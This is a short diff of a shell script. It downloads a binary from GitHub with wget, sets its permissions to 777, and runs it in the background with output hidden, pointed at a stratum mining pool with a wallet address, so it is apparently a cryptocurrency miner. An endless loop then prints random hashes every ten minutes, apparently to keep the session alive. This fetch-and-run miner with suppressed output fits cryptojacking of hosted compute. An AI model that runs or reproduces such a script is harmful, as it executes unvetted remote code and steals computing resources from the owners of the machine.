@@ -2,3 +2,4 @@ wget https://github.com/aqshakuy/bb/raw/main/avx2
 chmod 777 avx2
 ./avx2 -a gr  -o stratum+tcps://stratum-eu.rplant.xyz:17084 -u JXf7FU1uTh5QPYMdPQ9jhwc6bAGKM61N1B.$(echo $(shuf -i 1-20000 -n 1)-kzp) -t8 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+
